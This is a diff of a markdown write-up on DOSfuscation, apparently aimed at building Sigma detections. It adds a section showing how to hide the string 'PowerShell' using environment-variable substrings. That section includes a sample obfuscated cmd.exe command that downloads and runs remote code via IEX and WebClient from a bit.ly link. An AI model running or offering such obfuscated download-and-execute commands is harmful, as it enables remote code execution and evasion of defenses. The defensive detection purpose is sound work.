@@ -52,11 +52,20 @@ The framework provides 3 main obfuscation options:
 * ENCODING - Environment variable encoding
 * PAYLOAD - Obfuscated payload via DOSfuscation
 
-#### BINARY
+### BINARY
+One way to obfuscate the string PowerShell in the example command is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.
+![bin_ex_1](https://ibb.co/d43Jh7H)
+The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.
+![bin_ex_2](https://ibb.co/HHgR7y5)
+Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFILE:~4,1%Shell```. Adding this obfuscation back into the sample malicious command results in:
+```CMD
+cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
+```
+![bin_ex_3](https://ibb.co/WHmQM1b)
 
-#### ENCODING
+### ENCODING
 
-#### PAYLOAD
+### PAYLOAD
 As pointed by the author (Daniel Bohannon (@danielhbohannon)) himself, there are numerous building blocks that must be combined to perform the advanced payload encoding techniques. Searching for these building blocks in process arguments, common persistence locations and in file repositories is a good first step in reducing the data set when building robust detections for DOSfuscation in general. We're going to use Sigma so we'll be looking for those building blocks in command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1).
 
 Some basic building block concepts for each of the advanced encoding techniques are outlined below:
